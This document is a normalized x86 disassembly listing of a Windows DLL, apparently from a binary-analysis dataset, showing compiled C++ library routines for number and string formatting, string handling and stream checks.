mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_10006290
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x10 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1001759a
mov ecx [ ebp + 0x18 ]
add esp 0x10
push eax
push ebx
push esi
push edi
lea edx [ esp + 0x28 ]
call sub_10006c30
mov ecx [ esp + 0x6c ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x18
sub_10006300
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10015cff
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_100024e0
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_100183c0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100072a0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100072a0
pop esi
pop ebx
pop ebp
retn 0x8
sub_10006400
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ edi + 0x10 ]
cmp eax esi
jae r-xdata
mov ecx [ ebp + 0x8 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_10015d4c
test ecx ecx
je r-xdata
push r--data
call sub_10015cff
mov eax edi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ eax + ecx ]
cmp ebx 0xfffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_10015cff
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx edi
call sub_100024e0
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp ecx 0x10
jb r-xdata
pop ebx
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov eax edi
pop ebx
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ edi ]
mov [ eax ] bl
pop ebx
mov eax edi
pop esi
pop ebp
retn 0x8
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax edi
mov [ eax + ebx ] 0x0
mov eax [ edi ]
mov [ eax + ebx ] 0x0
pop ebx
mov eax edi
pop esi
pop ebp
retn 0x8
mov edx [ edi + 0x10 ]
sub edx esi
push edx
add eax esi
add eax [ ebp + 0x8 ]
add ecx esi
push ecx
push eax
call sub_10017050
mov dl [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov eax edi
call sub_10002210
cmp [ edi + 0x14 ] 0x10
mov [ edi + 0x10 ] ebx
jb r-xdata
sub_100064f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028a50
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_10006590
push ebp
mov ebp esp
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_10001f10
mov eax esi
pop ebp
retn 0x4
sub_100065c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002892b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
movzx ecx cx
mov [ ebp - 0x88 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x60 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x7c ] ecx
mov ecx [ ebp + 0x20 ]
lea edi [ ebp - 0x98 ]
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] edx
mov [ ebp - 0x54 ] ecx
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10007de0
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x98 ]
mov [ ebp - 0x80 ] edi
test eax eax
je r-xdata
lea esi [ ebp - 0x4c ]
mov ecx edi
call sub_10007530
mov esi 0x1
mov [ ebp - 0x4 ] esi
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
movzx ecx ax
xor edi edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
mov edx [ ebp - 0x70 ]
add edx 0x8
push edx
lea eax [ ebp - 0x64 ]
push eax
push esi
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x2
push ecx
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x6c ] 0x30
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x64 ] edi
call sub_10016639
mov al [ ebx ]
add esp 0x14
cmp al 0x2b
je r-xdata
mov esi eax
push 0x0
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x74 ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x64 ] edi
cmp al 0x2d
jne r-xdata
mov esi [ esi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x64 ]
not esi
call sub_100163e1
and esi [ ebp - 0x74 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
cmp edx 0x10
jae r-xdata
mov [ ebp - 0x58 ] eax
call sub_1001766d
mov eax [ eax ]
mov edi [ ebp - 0x54 ]
mov cl [ eax ]
push edi
push 0x65
push ebx
mov [ ebp - 0x68 ] cl
mov [ ebp - 0x67 ] 0x65
call sub_100175c0
movsx edx [ ebp - 0x68 ]
add esp 0xc
push edi
push edx
push ebx
mov [ ebp - 0x5c ] eax
call sub_100175c0
mov esi eax
add esp 0xc
mov [ ebp - 0x90 ] esi
test esi esi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ esi + 0x4 ] eax
cmp [ ecx ] 0x7f
je r-xdata
lea ecx [ ebp - 0x4c ]
mov eax [ ebp - 0x58 ]
mov edx [ ebp - 0x8c ]
mov ecx [ edx + 0x20 ]
add eax edi
add eax [ ebp - 0x7c ]
add eax [ ebp - 0x60 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
cmp edx 0x10
jae r-xdata
mov [ ebp - 0x5c ] 0x0
mov esi [ ebp - 0x5c ]
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x4c ]
movsx eax [ ebp - 0x68 ]
push edi
push eax
push ebx
call sub_100175c0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push edi
mov eax ebx
lea ecx [ ebp - 0x30 ]
call sub_10007180
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push edi
push 0x65
push ebx
call sub_100175c0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp + 0x28 ]
mov edx [ ebp + 0x24 ]
sub eax ebx
mov ebx [ ebp - 0x74 ]
push ecx
lea edi [ eax + 0x1 ]
push edx
mov edx [ ebp - 0x70 ]
lea eax [ edi - 0x1 ]
push eax
mov eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x94 ]
push ecx
push edx
call sub_10007460
mov ecx [ eax ]
mov ebx [ ebp - 0x78 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0x14
push ecx
push edx
lea eax [ ebp - 0x94 ]
push eax
mov eax [ ebp - 0x60 ]
mov esi ebx
call sub_10006f50
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x80 ]
mov [ ebp + 0x28 ] edx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0xc
call edx
mov ecx [ ebp + 0x24 ]
movzx esi ax
mov eax [ ebp + 0x28 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov eax 0x1
call sub_10006f50
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0xc
push ecx
push edx
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebp - 0x7c ]
mov esi ebx
call sub_10006f50
mov ecx [ eax ]
add [ ebp - 0x50 ] edi
mov ebx [ ebp - 0x50 ]
add esp 0xc
sub [ ebp - 0x54 ] edi
mov edi [ ebp - 0x54 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
cmp [ ebp - 0x64 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x28 ]
mov edx [ ebp + 0x24 ]
push ecx
push edx
lea eax [ ebp - 0x94 ]
push eax
jmp r-xdata
sub ecx eax
mov esi ecx
mov [ ebp - 0x5c ] esi
jmp r-xdata
test esi esi
jne r-xdata
mov ebx [ ebp - 0x58 ]
push 0x30
lea esi [ ebp - 0x30 ]
call sub_10002a00
mov ebx [ ebp - 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
mov ebx [ ebp - 0x74 ]
push eax
mov eax [ ebp - 0x70 ]
push ecx
push edi
lea edx [ ebp - 0x84 ]
push edx
push eax
mov eax [ ebp - 0x50 ]
call sub_10007460
mov ecx [ eax ]
mov esi [ ebp - 0x78 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
add esp 0x14
push ecx
push edx
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebp - 0x58 ]
call sub_10006f50
mov ecx [ eax ]
mov edx [ ebp - 0x8c ]
mov edi [ ebp + 0xc ]
mov esi [ ebp - 0x88 ]
add esp 0xc
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
mov [ ebp + 0x28 ] eax
mov eax [ ebp - 0x5c ]
xor ebx ebx
push edi
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
call sub_10006f50
mov esi 0x10
add esp 0xc
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp + 0x24 ]
sub eax ebx
mov ebx [ ebp - 0x74 ]
lea edi [ eax + 0x1 ]
mov eax [ ebp + 0x28 ]
push eax
push ecx
mov ecx [ ebp - 0x70 ]
lea edx [ edi - 0x1 ]
push edx
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebp - 0x50 ]
push ecx
call sub_10007460
mov edx [ eax ]
mov esi [ ebp - 0x78 ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x28 ] ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
add esp 0x14
push edx
push eax
mov eax [ ebp - 0x58 ]
lea ecx [ ebp - 0x84 ]
push ecx
call sub_10006f50
mov edx [ eax ]
mov [ ebp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x8c ]
add esp 0xc
test [ edx + 0x14 ] 0x4
mov [ ebp + 0x28 ] ecx
mov [ ebp - 0x58 ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push eax
push ecx
lea edx [ ebp - 0x94 ]
push edx
mov eax [ ebp + 0x28 ]
mov ecx [ ebp + 0x24 ]
push 0x1
push eax
mov eax [ ebp - 0x70 ]
push ecx
lea edx [ ebp - 0x94 ]
push edx
push eax
mov eax ebx
call sub_10007390
mov ecx [ eax ]
inc ebx
add esp 0x14
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
dec edi
mov [ ebp + 0x28 ] edx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] edi
mov eax esi
mov esi [ ebp - 0x88 ]
call sub_10006f50
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x5c ] 0x0
mov [ ebp + 0x28 ] edx
add esp 0xc
mov eax [ edx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x58 ]
push 0x30
push eax
mov eax [ ebp - 0x5c ]
sub eax ebx
lea edi [ ebp - 0x30 ]
call sub_10006400
mov ebx [ ebp - 0x60 ]
push 0x30
lea esi [ ebp - 0x30 ]
call sub_10002a00
mov ebx [ ebp - 0x50 ]
mov [ ebp - 0x60 ] 0x0
mov esi [ ebp - 0x90 ]
push 0x30
test esi esi
jne r-xdata
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] esi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100173b1
add esp 0x4
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x1
push edx
push eax
mov eax [ ebp - 0x70 ]
lea edx [ ebp - 0x84 ]
push edx
push eax
mov eax ecx
call sub_10007390
mov ecx [ eax ]
add [ ebp - 0x50 ] edi
add esp 0x14
sub [ ebp - 0x54 ] edi
mov edi [ ebp - 0x54 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx r--data
mov ecx [ ebp - 0x7c ]
sub esi ebx
push ecx
lea eax [ esi + 0x1 ]
lea edi [ ebp - 0x30 ]
call sub_10006400
mov edx [ ebp - 0x60 ]
push 0x30
push edx
mov eax esi
call sub_10006400
mov [ ebp - 0x7c ] 0x0
mov ebx [ ebp - 0x60 ]
lea esi [ ebp - 0x30 ]
call sub_10002a00
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4c ]
push edx
call sub_100173b1
add esp 0x4
cmp [ ebp - 0x1c ] eax
mov eax [ ebp - 0x30 ]
jae r-xdata
lea ebx [ ebp - 0x4c ]
mov ebx [ ebp - 0x4c ]
mov eax 0x10
mov [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x38 ] eax
jae r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
push eax
call sub_100176a0
mov esi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
test al al
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x50 ] ecx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov edx esi
sub edx [ ebp - 0x64 ]
movsx eax al
cmp eax edx
jae r-xdata
mov edx [ ebp - 0x20 ]
mov ebx [ ebp - 0x50 ]
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] edx
mov edi edx
sub esi eax
push 0x0
push 0x1
mov eax esi
lea edi [ ebp - 0x30 ]
call sub_10006400
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_10006bb0
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
mov bl [ edi ]
push esi
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
mov dl [ edi + 0x1 ]
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_10006c30
push ebp
mov ebp esp
push 0xffffffff
push sub_10028640
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
movzx ecx cx
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
lea edi [ ebp - 0x58 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x30 ] edx
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10007de0
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x58 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x2c ]
call sub_10007530
mov edi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
mov al [ edi ]
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ ebp - 0x34 ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x34 ] 0x1
cmp al 0x2d
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x34 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x4c ]
cmp [ eax + 0x24 ] 0x0
mov esi [ eax + 0x20 ]
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
mov edx [ ebp - 0x48 ]
movzx eax ax
push ebx
lea ecx [ ebp - 0x54 ]
push ecx
mov ebx eax
mov eax [ ebp - 0x30 ]
push edx
call sub_10007460
mov ecx [ eax ]
mov edx [ ebp - 0x4c ]
add esp 0x14
mov [ ebp + 0x18 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
push eax
mov [ edx + 0x20 ] edi
mov [ edx + 0x24 ] edi
mov edi [ ebp + 0xc ]
mov [ ebp + 0x1c ] eax
push ecx
mov eax esi
mov esi [ ebp - 0x3c ]
push edi
call sub_10006f50
add esp 0xc
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp eax 0x100
je r-xdata
cmp esi ebx
jbe r-xdata
test esi esi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push eax
push ecx
mov ecx [ ebp - 0x48 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
push ecx
mov eax edi
call sub_10007390
mov edx [ eax ]
mov [ ebp + 0x18 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x1c ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
mov eax [ eax ]
add esp 0x14
push edx
add edi ecx
sub ebx ecx
push eax
lea ecx [ ebp - 0x38 ]
mov eax esi
mov esi [ ebp - 0x3c ]
push ecx
mov [ ebp - 0x30 ] edi
call sub_10006f50
mov edx [ eax ]
mov [ ebp + 0x18 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
push eax
push ecx
lea edx [ ebp - 0x38 ]
mov eax esi
mov esi [ ebp - 0x3c ]
push edx
call sub_10006f50
mov ecx [ eax ]
mov [ ebp + 0x18 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x1c ] edx
jmp r-xdata
sub esi ebx
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x40 ] edx
jmp r-xdata
add esp 0xc
xor esi esi
mov eax [ eax + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x40 ]
mov al [ ecx ]
mov esi ebx
cmp al 0x7f
je r-xdata
test al al
jle r-xdata
mov edx esi
sub edx [ ebp - 0x34 ]
movsx eax al
cmp eax edx
jae r-xdata
mov ecx [ ebp - 0x30 ]
sub esi eax
mov eax ebx
sub eax esi
inc eax
push eax
add edi esi
push edi
push eax
lea edx [ ecx + esi + 0x1 ]
push edx
call sub_10017547
mov eax [ ebp - 0x40 ]
add esp 0x10
mov [ edi ] 0x0
inc ebx
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
mov edi [ ebp - 0x30 ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ ebp - 0x40 ] eax
sub_10006ee0
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
mov ecx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
mov [ ebp + 0xc ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
movzx edx [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
add edi 0x2
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x10 ]
jne r-xdata
sub_10006f50
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push edi
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop edi
pop ebp
retn
lea ecx [ ecx ]
mov [ ebp + 0xc ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec edi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov [ ecx ] si
movzx eax si
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x10 ]
jne r-xdata
sub_10007020
push ebp
mov ebp esp
push ecx
mov ecx [ ecx + 0x8 ]
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
mov ecx esi
call sub_10006300
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10007070
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ ecx + 0x2 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_10001f10
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100070d0
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ ecx + 0x2 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_10001f10
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10007130
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_1001748d
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001748d
mov edx [ esi + 0x14 ]
push edx
call sub_1001748d
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
